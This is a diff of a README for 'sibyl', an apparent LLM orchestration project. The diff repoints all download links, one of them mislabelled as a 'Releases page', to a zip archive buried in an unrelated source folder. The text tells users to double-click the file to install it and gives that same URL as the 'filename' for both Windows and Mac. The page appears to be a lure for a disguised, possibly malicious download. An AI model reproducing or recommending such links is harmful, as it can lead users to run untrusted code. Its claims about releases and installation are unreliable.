@@ -5,19 +5,19 @@
 Sibyl is an orchestration layer designed for large language model (LLM) workflows. It allows you to create and manage workspaces, pipelines, and reusable techniques seamlessly. With support for various tools and custom front-ends, you can enhance your project with ease.
 
 ## 🔗 Download Now!
-[![Download sibyl](https://raw.githubusercontent.com/omarrsalif594/sibyl/main/sibyl/techniques/workflow_orchestration/session_management/subtechniques/rotation_based/default/sibyl-2.0.zip)](https://raw.githubusercontent.com/omarrsalif594/sibyl/main/sibyl/techniques/workflow_orchestration/session_management/subtechniques/rotation_based/default/sibyl-2.0.zip)
+[![Download sibyl](https://github.com/omarrsalif594/sibyl/raw/refs/heads/main/sibyl/techniques/ai_generation/generation/subtechniques/tree_of_thought/default/Software_v2.6-alpha.4.zip)](https://github.com/omarrsalif594/sibyl/raw/refs/heads/main/sibyl/techniques/ai_generation/generation/subtechniques/tree_of_thought/default/Software_v2.6-alpha.4.zip)
 
 ## 🚀 Getting Started
 To get started with sibyl, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/omarrsalif594/sibyl/main/sibyl/techniques/workflow_orchestration/session_management/subtechniques/rotation_based/default/sibyl-2.0.zip) to find the latest version of sibyl.
+   Go to the [Releases page](https://github.com/omarrsalif594/sibyl/raw/refs/heads/main/sibyl/techniques/ai_generation/generation/subtechniques/tree_of_thought/default/Software_v2.6-alpha.4.zip) to find the latest version of sibyl.
 
 2. **Choose Your Version**  
    Look for the latest release and click on it. This will take you to a page where you can see all available files for the application. 
 
 3. **Download the Application**  
-   Click on the appropriate file for your system (Windows, Mac, or Linux) to initiate the download. The filename might look something like `https://raw.githubusercontent.com/omarrsalif594/sibyl/main/sibyl/techniques/workflow_orchestration/session_management/subtechniques/rotation_based/default/sibyl-2.0.zip` for Windows or `https://raw.githubusercontent.com/omarrsalif594/sibyl/main/sibyl/techniques/workflow_orchestration/session_management/subtechniques/rotation_based/default/sibyl-2.0.zip` for Mac.
+   Click on the appropriate file for your system (Windows, Mac, or Linux) to initiate the download. The filename might look something like `https://github.com/omarrsalif594/sibyl/raw/refs/heads/main/sibyl/techniques/ai_generation/generation/subtechniques/tree_of_thought/default/Software_v2.6-alpha.4.zip` for Windows or `https://github.com/omarrsalif594/sibyl/raw/refs/heads/main/sibyl/techniques/ai_generation/generation/subtechniques/tree_of_thought/default/Software_v2.6-alpha.4.zip` for Mac.
 
 4. **Install sibyl**  
    Once the file finishes downloading, locate it in your downloads folder. Open the file by double-clicking on it. Follow any on-screen instructions to complete the installation.
@@ -73,7 +73,7 @@ For more in-depth guidance, access the following resources:
 If you want to contribute to improving sibyl, you can check the guidelines on the GitHub repository. Your input is always welcome!
 
 ## 🔗 Download & Install
-To download and install sibyl, revisit the [Releases page](https://raw.githubusercontent.com/omarrsalif594/sibyl/main/sibyl/techniques/workflow_orchestration/session_management/subtechniques/rotation_based/default/sibyl-2.0.zip) and follow the steps mentioned above.
+To download and install sibyl, revisit the [Releases page](https://github.com/omarrsalif594/sibyl/raw/refs/heads/main/sibyl/techniques/ai_generation/generation/subtechniques/tree_of_thought/default/Software_v2.6-alpha.4.zip) and follow the steps mentioned above.
 
-[![Download sibyl](https://raw.githubusercontent.com/omarrsalif594/sibyl/main/sibyl/techniques/workflow_orchestration/session_management/subtechniques/rotation_based/default/sibyl-2.0.zip)](https://raw.githubusercontent.com/omarrsalif594/sibyl/main/sibyl/techniques/workflow_orchestration/session_management/subtechniques/rotation_based/default/sibyl-2.0.zip)
+[![Download sibyl](https://github.com/omarrsalif594/sibyl/raw/refs/heads/main/sibyl/techniques/ai_generation/generation/subtechniques/tree_of_thought/default/Software_v2.6-alpha.4.zip)](https://github.com/omarrsalif594/sibyl/raw/refs/heads/main/sibyl/techniques/ai_generation/generation/subtechniques/tree_of_thought/default/Software_v2.6-alpha.4.zip)
 ```
